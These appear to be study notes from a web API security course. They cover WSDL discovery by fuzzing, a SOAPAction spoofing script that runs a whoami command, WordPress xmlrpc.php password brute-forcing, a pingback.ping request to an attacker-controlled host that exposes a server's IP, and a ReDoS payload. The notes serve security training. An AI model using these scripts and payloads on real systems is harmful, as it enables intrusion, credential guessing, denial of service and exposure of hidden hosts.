# API - OWASP top 10 2023





# Other attacks
## WSDL

WSDL stands for Web Service Description Language. WSDL is an XML-based file exposed by web services that informs clients of the provided services/methods, including where they reside and the method-calling convention.

A web service's WSDL file should not always be accessible. Developers may not want to publicly expose a web service's WSDL file, or they may expose it through an uncommon location, **following a security through obscurity approach**. In the latter case, directory/parameter fuzzing may reveal the location and content of a WSDL file.

Suppose we are assessing a SOAP service residing in ```http://<TARGET IP>:3002```. We have not been informed of a WSDL file. Let us start by performing basic directory fuzzing against the web service.

```bash
dirb http://<TARGET IP>:3002
```

It looks like ```http://<TARGET IP>:3002/wsdl``` exists. Let us inspect its content as follows:

```bash
curl http://<TARGET IP>:3002/wsdl 
```

The response is empty! Maybe there is a parameter that will provide us with access to the SOAP web service's WSDL file. Let us perform parameter fuzzing using ffuf and the burp-parameter-names.txt list, as follows. -fs 0 filters out empty responses (size = 0) and -mc 200 matches HTTP 200 responses:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200
```

It looks like **wsdl is a valid parameter**. Let us now issue a request for ```http://<TARGET IP>:3002/wsdl?wsdl```:

```bash
curl http://<TARGET IP>:3002/wsdl?wsdl
```

### WSDL file breakdown

The above WSDL file follows the WSDL version 1.1 layout and consists of the following elements:
- **Definition**: The root element of all WSDL files. Inside the definition, the name of the web service is specified, all namespaces used across the WSDL document are declared, and all other service elements are defined;
    ```xml
    <wsdl:definitions targetNamespace="http://tempuri.org/" 

        <wsdl:types></wsdl:types>
        <wsdl:message name="LoginSoapIn"></wsdl:message>
        <wsdl:portType name="HacktheBoxSoapPort">
        <wsdl:operation name="Login"></wsdl:operation>
        </wsdl:portType>
        <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
        <wsdl:operation name="Login">
            <soap:operation soapAction="Login" style="document"/>
            <wsdl:input></wsdl:input>
            <wsdl:output></wsdl:output>
        </wsdl:operation>
        </wsdl:binding>
        <wsdl:service name="HacktheboxService"></wsdl:service>

    </wsdl:definitions>
    ```

- **Data types**: The data types to be used in the exchanged messages;
    ```xml
    <wsdl:types>

        <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
        <s:element name="LoginRequest">
            <s:complexType>
                <s:sequence>
                    <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
                    <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
                </s:sequence>
            </s:complexType>
        </s:element>
        <s:element name="LoginResponse">
            <s:complexType>
                <s:sequence>
                    <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
                </s:sequence>
            </s:complexType>
        </s:element>
        <s:element name="ExecuteCommandRequest">
            <s:complexType>
                <s:sequence>
                    <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
                </s:sequence>
            </s:complexType>
        </s:element>
        <s:element name="ExecuteCommandResponse">
            <s:complexType>
                <s:sequence>
                    <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
                </s:sequence>
            </s:complexType>
        </s:element>
        </s:schema>
        
    </wsdl:types>
    ```

- **Messages**: Defines input and output operations that the web service supports. In other words, through the messages element, the messages to be exchanged, are defined and presented either as an entire document or as arguments to be mapped to a method invocation;

    ```xml
    <!-- Login Messages -->
    <wsdl:message name="LoginSoapIn">
        <wsdl:part name="parameters" element="tns:LoginRequest"/>
    </wsdl:message>
    <wsdl:message name="LoginSoapOut">
        <wsdl:part name="parameters" element="tns:LoginResponse"/>
    </wsdl:message>
    <!-- ExecuteCommand Messages -->
    <wsdl:message name="ExecuteCommandSoapIn">
        <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
    </wsdl:message>
    <wsdl:message name="ExecuteCommandSoapOut">
        <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
    </wsdl:message>
    ```

- **Operation**: Defines the available SOAP actions alongside the encoding of each message;
- **Port type**: Encapsulates every possible input and output message into an operation. More specifically, it defines the web service, the available operations and the exchanged messages. Please note that in WSDL version 2.0, the interface element is tasked with defining the available operations and when it comes to messages the (data) types element handles defining them;
    ```xml
    <wsdl:portType name="HacktheBoxSoapPort">

        <!-- Login Operaion | PORT -->
        <wsdl:operation name="Login">
            <wsdl:input message="tns:LoginSoapIn"/>
            <wsdl:output message="tns:LoginSoapOut"/>
        </wsdl:operation>
        <!-- ExecuteCommand Operation | PORT -->
        <wsdl:operation name="ExecuteCommand">
            <wsdl:input message="tns:ExecuteCommandSoapIn"/>
            <wsdl:output message="tns:ExecuteCommandSoapOut"/>
        </wsdl:operation>
    
    </wsdl:portType>
    ```

- **Binding**: Binds the operation to a particular port type. Think of bindings as interfaces. A client will call the relevant port type and, using the details provided by the binding, will be able to access the operations bound to this port type. In other words, bindings provide web service access details, such as the message format, operations, messages, and interfaces (in the case of WSDL version 2.0);

    ```xml
    <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">

        <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
        <!-- SOAP Login Action -->
        <wsdl:operation name="Login">
        <soap:operation soapAction="Login" style="document"/>
        <wsdl:input>
            <soap:body use="literal"/>
        </wsdl:input>
        <wsdl:output>
            <soap:body use="literal"/>
        </wsdl:output>
        </wsdl:operation>
        <!-- SOAP ExecuteCommand Action -->
        <wsdl:operation name="ExecuteCommand">
        <soap:operation soapAction="ExecuteCommand" style="document"/>
        <wsdl:input>
            <soap:body use="literal"/>
        </wsdl:input>
        <wsdl:output>
            <soap:body use="literal"/>
        </wsdl:output>
        </wsdl:operation>

    </wsdl:binding>
    ```

- **Service**: A client makes a call to the web service through the name of the service specified in the service tag. Through this element, the client identifies the location of the web service.

    ```xml
    <wsdl:service name="HacktheboxService">

        <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
            <soap:address location="http://localhost:80/wsdl"/>
        </wsdl:port>

    </wsdl:service>
    ```

<br>
<br>
<br>
<br>

## SOAPAction spoofing

SOAP messages towards a SOAP service should include both the operation and the related parameters. 

This operation resides in the first child element of the SOAP message's body. **If HTTP is the transport of choice, it is allowed to use an additional HTTP header called SOAPAction**, which contains the operation's name.

The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.

If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.

Suppose we are assessing a SOAP web service, whose WSDL file resides in ```http://<TARGET IP>:3002/wsdl?wsdl```.

The first thing to pay attention to is the following:

```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

We can see a SOAPAction operation called ExecuteCommand.

Let us take a look at the parameters:

```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

We notice that there is a ```cmd parameter```. Let us build a Python script to issue requests (save it as client.py). Note that the below script will try to have the SOAP service execute a whoami command:

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

We get an error mentioning This function is only allowed in internal networks. We have no access to the internal networks. Does this mean we are stuck? Not yet! **Let us try a SOAPAction spoofing attack**, as follows:

Let us build a new Python script for our SOAPAction spoofing attack (save it as client_soapaction_spoofing.py):
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

- We specify ```LoginRequest in <soap:Body>```, so that our request goes through. This operation is allowed from the outside;
- We specify the parameters of ExecuteCommand because we want to have the SOAP service execute a whoami command;
- We specify the blocked operation (ExecuteCommand) in the SOAPAction header.


If the web service determines the operation to be executed based solely on the SOAPAction header, we may **bypass the restrictions and have the SOAP service execute a whoami command**.

<br>
<br>
<br>
<br>

## Attacking WordPress 'xmlrpc.php'

It is important to note that xmlrpc.php being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, xmlrpc.php can facilitate some enumeration and exploitation activities, though.

Suppose we are assessing the security of a WordPress instance residing in ```http://blog.inlanefreight.com```. Through enumeration activities, we identified a valid username, admin, and that ```xmlrpc.php is enabled```. Identifying if xmlrpc.php is enabled is as easy as requesting xmlrpc.php on the domain we are assessing.

We can mount a password brute-forcing attack through xmlrpc.php, as follows:

```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

You may ask how we identified the correct method to call (**system.listMethods**). We did that by going **through the well-documented Wordpress code** and interacting with xmlrpc.php, as follows:

```bash
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php




<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Inside the list of available methods above, pingback.ping is included. pingback.ping allows for XML-RPC pingbacks. According to WordPress, a pingback is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks.

Unfortunately, if pingbacks are available, they can facilitate:
- **IP Disclosure** - An attacker can call the pingback.ping method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
- **Cross-Site Port Attack (XSPA)** - An attacker can call the pingback.ping method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences;
- **Distributed Denial of Service Attack (DDoS)** - An attacker can call the pingback.ping method on numerous WordPress instances against a single target.

Find below how an **IP Disclosure attack could be mounted if xmlrpc.php is enabled and the pingback.ping method is available**. XSPA and DDoS attacks can be mounted similarly.

Suppose that the WordPress instance residing in http://blog.inlanefreight.com is protected by Cloudflare. As we already identified, it also has xmlrpc.php enabled, and the pingback.ping method is available.

As soon as the below request is sent, the attacker-controlled host will receive a request (pingback) originating from ```http://blog.inlanefreight.com```, verifying the pingback and exposing ```http://blog.inlanefreight.com```'s public IP address.

```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```


<br>
<br>
<br>
<br>

## ReDOS

Suppose we have a user that submits benign input to an API. On the server side, a developer could match any input against a regular expression. After a usually constant amount of time, the API responds. In some instances, an attacker may be able to cause significant delays in the API's response time by submitting a crafted payload that tries to exploit some particularities/inefficiencies of the regular expression matching engine.

The API resides in ```http://<TARGET IP>:3000/api/check-email``` and accepts a parameter called email.

```bash
curl "http://<TARGET IP>:3000/api/check-email?email=test_value"




{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

Submit the above regex to ```regex101.com``` for an in-depth explanation. Then, submit the above regex to ```https://jex.im/regulex/``` for a visualization.

The second and third groups are doing bad iterative checks.

Let's submit the following valid value and see how long the API takes to respond.

```bash
curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."




{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

You will notice that the API takes several seconds to respond and that longer payloads increase the evaluation time.

The difference in response time between the first cURL command above and the second is significant.

The API is undoubtedly vulnerable to ReDoS attacks.

<br>
<br>
<br>
<br>
